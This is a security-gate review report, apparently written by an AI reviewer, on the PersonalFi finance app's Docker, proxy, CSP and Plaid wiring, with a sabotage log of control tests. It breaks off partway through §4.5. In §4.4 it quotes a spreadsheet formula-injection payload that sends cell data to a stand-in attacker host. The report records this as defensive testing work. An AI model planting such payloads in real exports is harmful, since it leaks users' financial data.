<!-- SPDX-License-Identifier: MIT -->

# Phase 1 security gate — independent review

**Reviewer:** Opus security gate, independent of every Phase 1 work package.
**Tree:** `/home/chris/Projects/PersonalFi`, branch `main`, HEAD at dispatch `fc1b2b8`
(the brief said `9dacde5`; `fc1b2b8` is the orchestrator's own one-line execution-log
commit on top of it — `git diff --stat 9dacde5 HEAD` is one line of
`docs/plan/01-execution-log.md`, so the code under review is `9dacde5`).
**Date:** 2026-09-15.

This file is written incrementally as each section is finished, so a rate-limit
kill loses nothing already appended.

## Standing instruction this gate was given

Phase 0 took three gate rounds because controls had green evidence written by
their own authors and had never been observed failing, the stack had never been
booted, and the first-run path had never been walked in a browser. This gate's
job was to make sure Phase 1 did not repeat that.

**It did repeat it.** The single most important finding below was found in the
first ten minutes of doing the thing nobody had done — `docker compose up` —
and it is the _same defect class_ as the Phase 0 gate's decisive finding, in the
same file, caused by the same mechanism.

---

## 0. Verdict

**GO-WITH-CONDITIONS.**

Conditions are listed in §6. The ledger, categorization, connector-port and
orchestrator work is genuinely solid and its controls are real — every sabotage
aimed at them went red. What is not solid is the _deployed_ system: the Phase 1
API image had not booted since WP 1.2 landed, and Plaid — the headline Phase 1
deliverable — is unreachable in production by three independent structural
blockers, none of which any test could see because no test starts the image or
opens a browser against the real proxy.

---

## 1. Independent re-verification (Standard A)

Counts were re-derived, not read out of the evidence docs.

```
$ DATABASE_URL=postgres://personalfi:personalfi@127.0.0.1:5433/personalfi_dev \
    pnpm exec vitest run --reporter=dot

 Test Files  90 passed | 1 skipped (91)
      Tests  1443 passed | 2 skipped (1445)
   Duration  259.64s
```

Matches wp1.7's claim of 90 files / 1443 tests exactly. The 1 skipped file and
2 skipped tests are `connector-plaid`'s live-Sandbox smoke, which skips itself
with no `PLAID_CLIENT_ID`/`PLAID_SECRET` in the shell — expected, and matches
wp1.3 §7a.

---

## 2. The production stack (Standard C, part 1 — before the browser)

### 2.1 F-1 (CRITICAL, fixed in place) — the api image has not booted since WP 1.2

A genuinely cold `docker compose up` on this machine (no `personalfi_pgdata`,
no `personalfi_backups`, no `caddy_data` volumes — `docker volume ls` showed
only the _dev_ database's volume beforehand):

```
$ docker compose up -d
 Container personalfi-db-1         Healthy
 Container personalfi-migrator-1   Exited
 Container personalfi-api-1        Started
 Container personalfi-api-1        Error dependency api failed to start
dependency failed to start: container personalfi-api-1 is unhealthy

$ docker compose logs api
api-1  | entrypoint: ROLE=api target "./apps/api/src/main.ts" exists, but something it imports does not resolve.
api-1  |   Cannot find package '@connector/csv' imported from /app/apps/api/src/domain.ts
api-1  |   This usually means the image build pruned a workspace package that is in the
api-1  |   production dependency closure. Check api.Dockerfile's deploy stage.
```

Root cause, confirmed by looking inside the image rather than by reading the
Dockerfile:

```
$ docker run --rm --entrypoint sh personalfi/api:dev -c 'ls /app/packages/connectors'
ls: /app/packages/connectors: No such file or directory
```

`docker/api.Dockerfile`'s prune stage computed its **keep** set by asking pnpm
(that part was the Phase 0 gate's own fix) but computed its **delete** set from
a hardcoded two-level glob:

```dockerfile
for dir in apps/* packages/* packages/contexts/*; do \
  [ -d "$dir" ] || continue; \
  [ "$dir" = packages/contexts ] && continue; \
  echo "$KEEP" | grep -qx "$dir" || rm -rf "$dir"; \
done
```

WP 1.2 added `packages/connectors/{port,manual,csv,plaid}`. The grouping
directory `packages/connectors` matches `packages/*`, is not itself a workspace
project and so can never appear in `$KEEP`, and was therefore `rm -rf`'d whole —
taking all four connectors with it. `packages/contexts` survived only because it
had a hand-written special case, which is precisely the "hand-maintained list of
a computed set will rot" failure the surrounding comment warns about.

This is the Phase 0 gate's decisive finding (_"the api image shipped an
`apps/api` whose very first import resolved to a symlink into a directory this
line had just deleted"_) recurring in the same `RUN` instruction, one phase
later, because only half of it was made computed.

**Why nothing caught it:** nothing in `just verify`, `just check` or
`.github/workflows/ci.yml` ever _starts_ the image. `just build` builds it and
CI builds it multi-arch, and a build that produces a broken image exits 0.

**Fixed in place** (26 lines of Dockerfile, mostly the comment). The delete set
is now computed from `pnpm list -r --depth -1 --json`, i.e. the set of things
that _are_ workspace projects, so a grouping directory at any nesting is never a
deletion candidate:

```dockerfile
projects() { node -e '...relative("/app", p.path)...'; } && \
KEEP="$(pnpm list --filter '@app/api...' --depth -1 --prod --json | projects)" && \
ALL="$(pnpm list -r --depth -1 --json | projects)" && \
test -n "$KEEP" && test -n "$ALL" && \
echo "$KEEP" | grep -qx 'apps/api' && \
for dir in $ALL; do \
  case "$dir" in /*|*..*) echo "refusing to prune $dir" >&2; exit 1;; esac; \
  [ -d "$dir" ] || continue; \
  echo "$KEEP" | grep -qx "$dir" || rm -rf "$dir"; \
done && \
find apps packages -depth -type d -empty -delete 2>/dev/null || true
```

Proof after `just build`:

```
$ docker run --rm --entrypoint sh personalfi/api:dev -c 'ls /app/packages/connectors'
csv
manual
plaid
port

$ docker compose up -d
 Container personalfi-api-1    Healthy
 Container personalfi-proxy-1  Started
$ docker compose ps -a
personalfi-api-1        Up 6 seconds (healthy)
personalfi-backup-1     Up 2 minutes (healthy)
personalfi-db-1         Up 2 minutes (healthy)
personalfi-migrator-1   Exited (0)
personalfi-proxy-1      Up (health: starting)
personalfi-worker-1     Up 5 seconds (healthy)
```

**And a regression test, not just this transcript.** `apps/api/test/gate-image-closure.test.ts`
asks pnpm for `@app/api`'s production closure, asserts every project in it is
present inside the built image, and then asks Node _inside the image_ to
`import('/app/apps/api/src/domain.ts')` — the exact import that failed. It skips
when Docker or the image is absent, so it is a post-build gate. Proven
load-bearing by rebuilding the **broken** Dockerfile and running it against that
image:

```
$ git stash push -- docker/api.Dockerfile      # back to the broken version
$ docker build -f docker/api.Dockerfile -t personalfi/api:gate-sabotage .
$ PERSONALFI_API_IMAGE=personalfi/api:gate-sabotage pnpm exec vitest run --project api gate-image-closure

 FAIL  api image closure (personalfi/api:gate-sabotage) > contains every workspace project apps/api needs at runtime
AssertionError: pruned out of the image but required at runtime:
  packages/connectors/csv, packages/connectors/port,
  packages/connectors/manual, packages/connectors/plaid
 FAIL  api image closure (personalfi/api:gate-sabotage) > can import the composition root inside the image
      Tests  2 failed (2)
```

Nothing runs it in CI yet — that is condition C-1c.

### 2.2 F-2 (HIGH) — Plaid is not configured in the production stack at all

`compose.yml` declares six secrets (`database_url`, `pg_password`, `master_key`,
`age_recipient`, `b2_key_id`, `b2_application_key`). It declares **no**
`plaid_client_id`, `plaid_secret` or `plaid_env`, and neither `api` nor `worker`
mounts them (`secrets: [database_url, master_key]` on both). WP 1.3b added
Plaid as _file_ secrets read from `SECRETS_DIR` — correctly, per the no-env-fallback
rule — and then nothing ever delivered those files into the containers.

Observed on the running stack, from the api's own boot log:

```
api-1 | {"level":"info","service":"api","provider":"plaid",
        "msg":"plaid not configured; connector not registered"}
api-1 | {"level":"info","service":"api","config":{...,
        "PLAID_REDIRECT_URI":null,"PLAID_WEBHOOK_URL":null,
        "PLAID_ALLOW_PRODUCTION":false,
        "secretsPresent":["database_url","master_key"]},...}

$ docker compose exec -T api ls -la /run/secrets/
-r--r--r--  1 node node  106 database_url
-r--r--r--  1 node node   64 master_key
```

The secrets exist on the host (`./secrets/plaid_client_id`, `plaid_secret`,
`plaid_env`, all present and 0400) — they are simply never mounted. Consequences
in the deployed system: `GET /connectors` omits Plaid, `POST
/connections/plaid/link-token` returns `503 connections.unknown_provider`, and
the entire WP 1.6 Plaid UI is dead. Also unset is `PLAID_REDIRECT_URI`, without
which no bank that uses OAuth can be linked at all (D12 names
`https://<node>.<tailnet>.ts.net/link/oauth` as the redirect).

Neither `RUNBOOK.md` nor `.env.example` mentions Plaid secrets anywhere
(`grep -i plaid` over both returns only two prose references in the panic-button
section), so an operator following the documented install gets no Plaid.

This is a straightforward wiring gap, but it is load-bearing: the Phase 1 exit
criterion _"two real institutions syncing on schedule"_ is structurally
unreachable in the deployed system, not merely unproven.

### 2.3 F-3 (HIGH) — the proxy CSP blocks Plaid Link in three separate ways

`docker/Caddyfile`'s single policy, applied to every listener:

```
Content-Security-Policy "default-src 'self'; script-src 'self'; style-src-elem 'self';
  style-src-attr 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self';
  connect-src 'self'; worker-src 'self' blob:; manifest-src 'self'; object-src 'none';
  frame-ancestors 'none'; base-uri 'none'; form-action 'self'"
```

`apps/web/src/lib/plaid-link.ts` loads `https://cdn.plaid.com/link/v2/stable/link-initialize.js`
by injecting a `<script>` and then renders Link in an iframe that talks to
`https://sandbox.plaid.com` / `https://production.plaid.com`. Against the policy
above that fails on:

1. `script-src 'self'` — the CDN script is refused before it ever executes.
2. `default-src 'self'` with no `frame-src` — Link's iframe is refused.
3. `connect-src 'self'` — Link's XHR/fetch to `*.plaid.com` is refused.

and additionally `Cross-Origin-Embedder-Policy: require-corp` will block both
the cross-origin script and the iframe unless Plaid serves `Cross-Origin-Resource-Policy`
/ `Cross-Origin-Embedder-Policy` headers that satisfy it, which is not something
this deployment controls.

WP 1.6 knew and said so, in the module doc comment of the file that needs it:

> **CSP note**: loading `cdn.plaid.com` needs `script-src`/`connect-src`
> `https://cdn.plaid.com` and `https://production.plaid.com`/`https://sandbox.plaid.com`
> in the proxy's Content-Security-Policy header (Caddy, not `apps/web` —
> `scripts/check-csp.ts` only checks the built HTML for an inline `<script>`, not
> the runtime CSP header). Flagged in the evidence doc for whoever owns that config.

Nobody owned it. The `csp` Playwright project reads the policy _out of the
Caddyfile_ (the Phase 0 R-1 fix), so it asserts the policy is what the Caddyfile
says — which is true, and says nothing about whether the application works under
it. A control that derives its expectation from the artifact it is checking
cannot fail; this is the same shape as the Phase 0 R-1 finding, surviving into
Phase 1 in a place where it now matters.

**Not fixed by this gate**, deliberately — see §6, condition C-2. Widening a CSP
is a security decision with a threat-model consequence (§5), not a typo, and the
exact allowlist depends on whether OAuth institutions are in scope. The proposed
diff is in §6.

### 2.4 R-13 from Phase 0 — resolved, confirmed on a genuinely cold start

The Phase 0 gate's carried Low was _"a cold `docker compose up` reliably lands
`backup` unhealthy until the first post-migration backup."_ On this gate's cold
start (volumes created from nothing) it did not:

```
backup-1 | backup-loop: starting; nightly run at 2:00 UTC
backup-1 | backup-loop: schema_migrations present after 0s; proceeding with first backup
backup-1 | backup: dumping personalfi@db ...
backup-1 | backup: verified 157729 bytes, 359 restorable object(s), schema_migrations present
backup-1 | backup: wrote /backups/personalfi-20260915T125709Z.dump.age (157961 bytes)
backup-1 | backup: pruning entries older than 30 day(s) locally
backup-1 | backup: RCLONE_REMOTE not set; local-only backup
backup-1 | backup: complete
```

`docker compose ps` showed `personalfi-backup-1  Up 2 minutes (healthy)` with no
intervening unhealthy period. **R-13 closed.** Note the backup is encrypted and
structurally verified (359 restorable objects, `schema_migrations` present),
which is the H-2/H-5 control from Phase 0 doing real work on a fresh install.
`RCLONE_REMOTE` is unset so this is local-only — that is Chris's B2 hand action,
not a defect.

### 2.5 F-4 (CRITICAL) — Caddy proxies three API prefixes; the API mounts eleven

The decisive finding of the browser walk, and the reason the walk existed.

`docker/Caddyfile`'s routing policy says, in its own comment:

> The API mounts exactly three prefixes (`packages/contracts/openapi/openapi.json`:
> `/auth/*`, `/health`, `/ready`). Everything else is the SPA... the three real
> prefixes are listed by name.

That was true in Phase 0. WP 1.5 then added twenty-four routes and WP 1.3b three
more. The contract today:

```
$ node -e "…Object.keys(openapi.paths)… unique top-level prefixes…"
/accounts  /auth  /connections  /connectors  /health
/imports   /net-worth  /ready  /sync  /transactions  /transfers
total paths: 43
```

Eleven prefixes; the Caddyfile lists three. The other eight fall through to the
SPA catch-all, which rewrites any extensionless path to `/index.html`. Measured
through the real proxy, with the real internal-CA certificate:

```
$ for p in /connectors /connections /transactions /accounts /net-worth \
           /sync/stream /imports/csv /auth/session /ready; do … done

  /connectors      200  <!doctype html><html lang="en
  /connections     200  <!doctype html><html lang="en
  /transactions    200  <!doctype html><html lang="en
  /accounts        200  <!doctype html><html lang="en
  /net-worth       200  <!doctype html><html lang="en
  /sync/stream     200  <!doctype html><html lang="en
  /imports/csv     200  <!doctype html><html lang="en
  /auth/session    401  {"type":"https://personalfi.lo
  /ready           200  {"status":"ready","database":"
```

**Every Phase 1 API route is unreachable through the production proxy**, and
answers `200 text/html` rather than an error. The same thing seen from inside
the browser during the walk (§3), after a successful real passkey login:

```
GET /auth/session  -> 200 {"userId":"01a0…","authMethod":"webauthn","fresh":true}
GET /connections   -> 200 <!doctype html> …
GET /connectors    -> 200 <!doctype html> …
GET /sync/stream   -> 200 <!doctype html> …
```

and the resulting client crash on the transactions screen:

```
TypeError: Cannot read properties of undefined (reading 'accountId')
    at https://personalfi.lan/assets/TransactionsList-ChK3IrwD.js:1:9382
```

**This is worse than an outage, because it is silent.** The connections screen
did not show an error. It showed _"No connections yet — Link a bank, import a
file, or add a manual account"_ (screenshot `gate-07-connections.png`): the
client received `200` with an HTML body, failed to find connections in it, and
rendered a perfectly plausible empty state. A user would believe it.

#### Why this is not a one-line fix, and why the gate did not apply one

The obvious patch — list the other eight prefixes beside `/auth/*` — **does not
work**, because the API and the SPA share a namespace:

| Path            | SPA route (`apps/web/src/routes`) | API route (`openapi.json`) |
| --------------- | --------------------------------- | -------------------------- |
| `/transactions` | `_app.transactions.tsx`           | `GET /transactions`        |
| `/accounts`     | `_app.accounts.tsx`               | `GET /accounts`            |

`GET /transactions` from a browser address bar must return the app shell;
`GET /transactions` from the app's `fetch` must return JSON. They are the same
method, the same path and the same origin, distinguishable only by `Accept` or
`Sec-Fetch-Dest`. Routing by prefix cannot serve both.

Note the irony in the file's own history: Phase 0's M-3 finding removed a
`handle /api/*` block _because it proxied without stripping the prefix against
an API that mounted nothing under `/api`_. The block was broken, but the idea
was right; deleting it rather than fixing it is what left no namespace for the
API to grow into.

**Recommended fix (not applied — see §6, condition C-1).** Give the API its own
prefix and strip it:

```caddyfile
handle_path /api/* {
    reverse_proxy api:8080 {
        header_up X-Forwarded-For {remote_host}
        header_up X-Forwarded-Proto https
    }
}
```

with, in the same change: `servers: [{ url: '/api' }]` in the OpenAPI document,
a regenerated `apps/web/src/api/generated` (or a `baseUrl` of `/api` on the
client), the service worker's default-deny rules updated from `/auth` to
`/api`, and `apps/web/e2e/support/mock-api.ts` updated to match. That spans four
packages and a codegen step — well outside this gate's ≤30-line fix budget, and
not a change to make without the contract owner.

**And a control so it cannot rot again.** The reason this shipped is that
nothing compares the Caddyfile's proxied prefixes to the contract's. The
Phase 0 gate fixed the _keep_ half of the api image prune and left the _delete_
half hardcoded (F-1); the same asymmetry is here. A CI check that parses
`openapi.json`'s top-level prefixes and asserts the Caddyfile proxies exactly
that set would have failed the day WP 1.5 landed. Proposed as condition C-1b.

---

## 3. The browser walk (Standard C)

Driven by the Playwright script reproduced verbatim in §7 (kept in this file
rather than as a `.mjs` in the tree, so the repo's eslint config does not have
to be widened for browser globals in `docs/`), against the production compose stack — Caddy, api, worker,
postgres, backup — with:

- **the real internal-CA certificate, pinned.** Not `ignoreHTTPSErrors`, which
  trusts anything and proves nothing. Chromium was launched with
  `--ignore-certificate-errors-spki-list=<sha256 of the leaf SPKI>`, so exactly
  Caddy's certificate is accepted and a substituted one would still fail. The
  chain was separately verified with `curl --cacert` (`ssl_verify_result 0`).
- **a real CDP virtual authenticator** (`WebAuthn.addVirtualAuthenticator`,
  ctap2/internal, resident key, user verification), not the page-level
  `navigator.credentials` override `apps/web/e2e/support/fake-webauthn.ts` uses.
  The real ceremony runs.
- `--host-resolver-rules=MAP personalfi.lan 127.0.0.1`, since this host has no
  `/etc/hosts` entry and the gate may not edit one.

Live security headers, as served (`curl -I` through Caddy):

```
strict-transport-security: max-age=31536000; includeSubDomains
x-content-type-options: nosniff
x-frame-options: DENY
referrer-policy: no-referrer
cross-origin-opener-policy: same-origin
cross-origin-embedder-policy: require-corp
cross-origin-resource-policy: same-origin
permissions-policy: geolocation=(), camera=(), microphone=(), payment=(), usb=()
content-security-policy: default-src 'self'; script-src 'self'; … connect-src 'self'; …
```

### Transcript

| #   | Step                                        | URL                                                | Observed                                                                                                                                                                                                                                                                                       | Screenshot                 |
| --- | ------------------------------------------- | -------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------- |
| 1   | Open the one-time enrolment link            | `https://personalfi.lan/register#token=<redacted>` | Page titled _PersonalFi_, "Set up a passkey". TLS validated against the pinned internal-CA leaf.                                                                                                                                                                                               | `gate-01-register.png`     |
| 2   | Click **Create passkey**                    | same                                               | Real WebAuthn `create()` against the virtual authenticator.                                                                                                                                                                                                                                    | `gate-02-after-enrol.png`  |
| 3   | Post-enrolment                              | same                                               | —                                                                                                                                                                                                                                                                                              | `gate-03-post-enrol.png`   |
| 4   | Navigate to `/`                             | redirected to `/login?redirect=%2F`                | Route guard works: an unauthenticated deep link is bounced to login.                                                                                                                                                                                                                           | —                          |
| 5   | Click **Sign in with a passkey**            | `/`                                                | **`GET /auth/session -> 200 {"userId":"01a0a533-…","displayName":"Gate Reviewer","authMethod":"webauthn","fresh":true,"trustedDevice":false,…}`** — a real passkey login over TLS through Caddy, end to end.                                                                                   | `gate-04-signed-in.png`    |
| 6   | `/transactions`                             | `/transactions`                                    | App frame renders; the list crashes: `TypeError: Cannot read properties of undefined (reading 'accountId')` — the API call returned the SPA shell (F-4).                                                                                                                                       | `gate-05-transactions.png` |
| 7   | `/accounts`                                 | `/accounts`                                        | Frame renders, no accounts (F-4).                                                                                                                                                                                                                                                              | `gate-06-accounts.png`     |
| 8   | `/accounts/connections`                     | `/accounts/connections`                            | Full UI renders: sidebar, "Connections", **"No connections yet — Link a bank, import a file, or add a manual account"**, _Add connection_ CTA, "No syncs yet" SSE status. This empty state is a **lie produced by F-4**, not a true reading.                                                   | `gate-07-connections.png`  |
| 9   | Probe Plaid's CDN script under the live CSP | `/accounts/connections`                            | **`blocked`**. `securitypolicyviolation`: `script-src-elem :: https://cdn.plaid.com/link/v2/stable/link-initialize.js`. Console: _"Loading the script … violates the following Content Security Policy directive: `script-src 'self'` … The action has been blocked."_ Empirical proof of F-3. | `gate-08-plaid-probe.png`  |

### What the walk could and could not reach

**Reached and proven working:** TLS with the internal CA; the security-header
set; the SPA shell, router, route guard and login redirect; **a real passkey
enrolment and a real passkey login against the real API** (P0-4, re-proven for
Phase 1); the SSE status control rendering; the whole Phase 1 UI shell.

**Could not be reached, because of F-1/F-2/F-3/F-4, not because the gate ran out
of time:** adding a Manual account, importing a CSV, seeing transactions,
editing a category or a note, seeing balances, and linking a Plaid Sandbox Item
through Link. Every one of those needs an API call, and every one of those API
calls returns the SPA shell through the proxy. The brief asked for this walk
precisely so somebody would find that out.

The Plaid exchange path _was_ exercised against the real thing, just not through
this stack — `apps/api/test/db/plaid-sandbox.test.ts` drives live Plaid Sandbox
`/sandbox/public_token/create` → `POST /connections/plaid/exchange` → a completed
sync over real HTTP, and passes (wp1.3b §5; skipped in this gate's runs because
the gate shell carries no Plaid credentials by choice). That is real evidence
about the _adapter and the route_. It is not evidence about the _deployment_,
which is the gap this section documents.

### Worker and backup

```
$ docker compose ps -a
personalfi-api-1        Up (healthy)
personalfi-worker-1     Up (healthy)
personalfi-db-1         Up (healthy)
personalfi-backup-1     Up (healthy)
personalfi-proxy-1      Up
personalfi-migrator-1   Exited (0)
```

The worker boots, derives the KEK and reports healthy. A **scheduled** sync
firing end to end could not be observed: with no connection linkable (F-4) there
is nothing for the scheduler to sync. This remains open — see §6, C-4, and it is
the same open item wp1.7 §7 item 2 already flagged.

Backup: verified on a genuinely cold start, §2.4. **R-13 closed.**

---

## 4. Sabotage log (Standard B)

Every control the brief named, each broken once in production code and observed
going red, then restored with `git checkout --`. "First try" means an existing
test failed without the gate writing anything.

| #    | Control                                                      | File / change                                                                                                                                           | Test                                                                                                                                                              | Result                                                                             |
| ---- | ------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
| S1   | Sealed connector credential custody (P0-1)                   | `packages/contexts/connections/src/connections.ts` — `secretBox.sealText(...)` → `Buffer.from(JSON.stringify(result.credentials),'utf8')`               | `connections-db` "seals the credential and stores no plaintext in the column" **and** `api-db` "…stores the token encrypted — never as plaintext (P0-1)"          | **RED first try, both layers.**                                                    |
| S2   | Plaid log hygiene (P0-12)                                    | `packages/connectors/plaid/src/connector.ts` — `listAccounts` logs `{ token: this.#accessToken(handle) }`                                               | `connector-plaid` `log-hygiene.test.ts`                                                                                                                           | **RED first try, 6 tests.**                                                        |
| S3a  | Step-up on `DELETE /connections/{id}`                        | `routes/connections.ts` `requireFreshSession` → `requireSession`                                                                                        | `api-db` "refuses to disconnect without a step-up assertion"                                                                                                      | **RED first try** (`expected 200 to be 403`). Status code only — see §4.1.         |
| S3b  | Step-up on `POST /connections/{id}/reconnect`                | same swap                                                                                                                                               | `api-db` "refuses to reconnect without a step-up assertion"                                                                                                       | **RED first try** (`expected 400 to be 403`). Status code only — see §4.1.         |
| S3c  | Step-up on `POST /connections/{id}/plaid/update-link-token`  | `routes/plaid.ts` same swap                                                                                                                             | `api-db` "refuses an update-mode token without a step-up assertion"                                                                                               | **RED first try** (`expected 200 to be 403`).                                      |
| S3d  | Step-up on `POST /connections/plaid/exchange`                | `routes/plaid.ts` same swap                                                                                                                             | `api-db` "refuses to exchange without a step-up assertion, and creates nothing"                                                                                   | **RED first try** (`expected 201 to be 403`).                                      |
| S4   | D16 ten-Item ratchet                                         | `routes/plaid.ts` `PLAID_ITEM_LIMIT = 10` → `9_999`                                                                                                     | `api-db` "refuses an eleventh Plaid connection (D16: Trial's ten-Item cap)"                                                                                       | **RED first try** (`expected 201 to be 409`).                                      |
| S5   | Production refusal without `PLAID_ALLOW_PRODUCTION`          | `packages/config/src/load.ts` — `false &&` before the production check                                                                                  | `config` "refuses to boot with plaid_env=production and no PLAID_ALLOW_PRODUCTION opt-in (D16)"                                                                   | **RED first try** (`expected undefined to be an instance of ConfigError`).         |
| S6   | `plaid_*` unreadable from env (no `envFallback`)             | `packages/config/src/schema.ts` — `plaid_secret` given `envFallback: 'PLAID_SECRET'`                                                                    | _(none existed)_                                                                                                                                                  | **STAYED GREEN — 67/67.** See §4.2. Gate test added; now RED.                      |
| S7   | pino/`censorDeep` redaction of the new Plaid paths           | `apps/api/src/logging.ts` — `'plaid-secret'` commented out of `SENSITIVE_KEYS`                                                                          | `api` "matches credential keys whatever their casing"                                                                                                             | **RED first try** (`not to contain 'SENTINEL-PLAID-SECRET-3d5a8e17'`).             |
| S8   | CSRF on every mutation (root `onRequest` hook)               | `apps/api/src/app.ts` — `assertCsrf(...)` removed from the hook                                                                                         | `api` `csrf.test.ts`                                                                                                                                              | **RED first try, 7 tests**, including "guards every unsafe method, not only POST". |
| S9   | User-scoping across ledger/connections reads and writes      | _(no single mutation; driven as 6 new cross-user tests)_                                                                                                | new `gate-phase1.test.ts`                                                                                                                                         | See §4.3 — all **PASS**; the scoping is real.                                      |
| S10  | Cursor never advances outside the write transaction          | `packages/contexts/connections/src/orchestrator.ts` — an `UPDATE connections SET transactions_cursor` before, and outside, `#commitPages`'s transaction | `connections-db` "leaves no partial delta when a failure is injected mid-pagination" + "never advances the cursor past what committed, for a window provider too" | **RED first try, 2 tests** (`expected '10' to be null`; `expected '9' to be '6'`). |
| S11a | A rule write never overwrites a user override                | `packages/contexts/ledger/src/overlay.ts` — `setRuleCategory` also sets `userCategoryId`                                                                | `ledger-db` "a rule write never overwrites — or is visible over — an existing user override"                                                                      | **RED first try.**                                                                 |
| S11b | Tier order: user beats rule                                  | `packages/contexts/ledger/src/effective.ts` — `overlay.userCategoryId ?? rule.ruleCategoryId` → reversed                                                | `ledger` + `ledger-db`                                                                                                                                            | **RED first try, 4 tests** across unit and db layers.                              |
| S12  | SSE requires a session                                       | `apps/api/src/routes/events.ts` — `requireSession` → `optionalSession` with a fallback user id                                                          | `api-db` "requires a session to open either stream"                                                                                                               | **RED first try** (`expected 200 to be 401`).                                      |
| S13  | CSV import limits / export formula injection                 | see §4.4                                                                                                                                                | new `gate-phase1.test.ts`                                                                                                                                         | **Export was VULNERABLE.** Fixed; see §4.4.                                        |
| S14  | Categorization consumer cannot write outside the owning user | `packages/contexts/ledger/src/read.ts` — `eq(transactions.userId, input.userId)` deleted from `listForCategorization`                                   | _(none existed)_                                                                                                                                                  | **STAYED GREEN — 511 tests.** See §4.5. Gate test added; now RED.                  |

### 4.1 Step-up refusals were red on the status code only (wp1.7 §7 item 1)

WP 1.7a asked the gate to sabotage `requireFreshSession` on disconnect and
reconnect and _"confirm both a 403 **and** an unchanged connection/cursor."_
Both went red on the 403 (S3a, S3b). Neither existing test asserts the second
half: a guard moved to _after_ `disconnectConnection` rather than removed would
still answer 403, having already destroyed the credential.

Closed by two tests in `apps/api/test/db/gate-phase1.test.ts`:

- _"a refused disconnect leaves the connection active and its sealed credential
  intact"_ — reads `connections.status` and `sealed_credentials` straight out of
  Postgres before and after the refused `DELETE`.
- _"a refused reconnect leaves the cursor and the credential untouched"_.

Writing these surfaced a detail worth recording: `ManualConnector.connect`
returns `credentials: {}` and `createConnection` correctly seals nothing, so
`sealed_credentials` is legitimately `NULL` on a manual row. The credential
assertions therefore run against a **Plaid** connection (`FakePlaidApi` through
the real `POST /connections/plaid/exchange`). Asserting "not null" on the manual
row would have been asserting a bug.

### 4.2 R-1 (HIGH) — "Plaid secrets are never readable from the environment" had no test

`packages/config/src/schema.ts` declares all three `plaid_*` secrets with
`envFallback: undefined` and a careful doc comment:

> **No `envFallback`, deliberately** (unlike `database_url`) … an env-var escape
> hatch here is exactly the leak surface 01 §1.10 warns about (`docker inspect`,
> crash dumps, child processes).

The gate gave `plaid_secret` an `envFallback: 'PLAID_SECRET'`:

```
$ pnpm exec vitest run --project config
      Tests  67 passed (67)
```

Sixty-seven green tests while a Plaid API secret became readable from the
process environment. `master_key` has had exactly this test since WP 0.2
("never read from the environment"); the three secrets added in WP 1.3b did not.
The rule was documentation, not a control — the precise pattern the gate-lessons
memory records.

**Closed** by `packages/config/src/gate-secret-custody.test.ts`, written
data-driven over `SECRET_SPECS` so secret number five is covered on the day it
is declared. Two layers: structural (`envFallback === undefined`) and
behavioural (`loadConfig` with the value only in `env` does not pick it up, and
`config.plaid` stays `null`). Under the same sabotage:

```
 FAIL  |config| src/gate-secret-custody.test.ts > … > has file-only secrets to check, and they include every plaid_* one
AssertionError: expected 3 to be greater than or equal to 4
 FAIL  |config| src/gate-secret-custody.test.ts > … > does not configure Plaid from a full set of environment variables
      Tests  2 failed | 6 passed (8)
```

Restored: `config` project 77/77 green.

### 4.3 User-scoping (brief item 9) — the scoping is real

Six new tests in `gate-phase1.test.ts` drive a genuine **second account holder**
(`database.createUser`, a real `users` row, a real session) against the first
holder's data. All pass against the code as committed:

- `GET /connections/{id}`, `GET /connections`, `GET /connections/{id}/sync-runs` → 404 / empty
- `DELETE /connections/{id}`, `POST …/reconnect`, `POST …/sync` → 404, row untouched
- `POST /imports/csv` with another user's `connectionId` → 404
- `GET|PATCH /transactions/{id}`, `POST /transactions/bulk`, `POST …/splits` → 404, owner's row unchanged
- the second holder's `GET /transactions` and `export.csv` are empty, not the first's
- `GET /accounts` is empty for the second holder

`GET /sync/stream` and `GET /connections/{id}/events` filter on
`eq(domainEvents.userId, options.userId)` in the query itself, so a stream opened
against another user's connection id yields nothing rather than their events
(S12 proves the session requirement itself is load-bearing).

### 4.4 R-2 (HIGH, fixed in place) — CSV export formula injection (CWE-1236)

`GET /transactions/export.csv` built every cell with:

```ts
/** RFC 4180: quote everything, double an embedded quote. Never guess. */
function csvCell(value: string | null): string {
  return `"${(value ?? '').replaceAll('"', '""')}"`;
}
```

Correct RFC 4180, and not a defence. Excel, LibreOffice Calc and Google Sheets
strip the quotes while parsing a `.csv` and _then_ evaluate a leading `=`, `+`,
`-` or `@`. The reachable fields are `name` — a **provider** merchant descriptor,
or a row from a CSV file the user was talked into importing — and `note`. So the
content is attacker-reachable and the sink is a spreadsheet on the user's own
machine, with `HYPERLINK`, `WEBSERVICE` and DDE all available.

Reproduced end to end through the real route: a manual-connector transaction
named `=HYPERLINK("https://attacker.example/?x="&A1,"Click")`, synced through
`applyProviderTransactions`, then exported:

```
AssertionError: export cell begins with a formula lead-in:
  =HYPERLINK(""https://attacker.example/?x
```

**Fixed** (`apps/api/src/routes/transactions.ts`, 27 lines with the comment): a
second helper `csvText` prefixes `'` — the OWASP-documented neutraliser, which
every major spreadsheet treats as "literal text" and does not display — when a
free-text cell begins with `= + - @ \t \r`, and the two free-text columns use it.
Deliberately **not** applied to `csvCell`: `amount_minor` is negative on every
outflow, and prefixing `-2500` would turn every amount in the file into text.

Post-fix: `gate-phase1.test.ts` 9/9 green; `transactions-routes.test.ts`
unaffected.

**Also checked, and clean:** the upload path is JSON (not `multipart`) under
Fastify's `bodyLimit: 1_048_576`, `files` is `min(1).max(20)`, `name` is capped
at 255 and never parsed, and the CSRF `onRequest` hook rejects an oversized body
_before it is parsed_ (measured: a 2 MiB body returns `403 csrf_failed`, not an
OOM). There is no archive handling and no filesystem path derived from a
filename, so there is no zip/path traversal surface.

### 4.5 R-3 (HIGH) — the categorization feed's user scope had no test

`listForCategorization` is the query behind the categorization consumer, which is
driven by an **outbox event carrying transaction ids it does not own** — the one
place in Phase 1 where a background writer takes ids from a message. The gate
deleted its ownership predicate:

```ts
// before
const conditions: (SQL | undefined)[] = [
  eq(transactions.userId, input.userId),
  isNull(transactions.removedAt),
];
// sabotaged
const conditions: (SQL | undefined)[] = [isNull(transactions.removedAt)];
```

```
$ vitest run --project ledger --project ledger-db --project categorization --project categorization-db
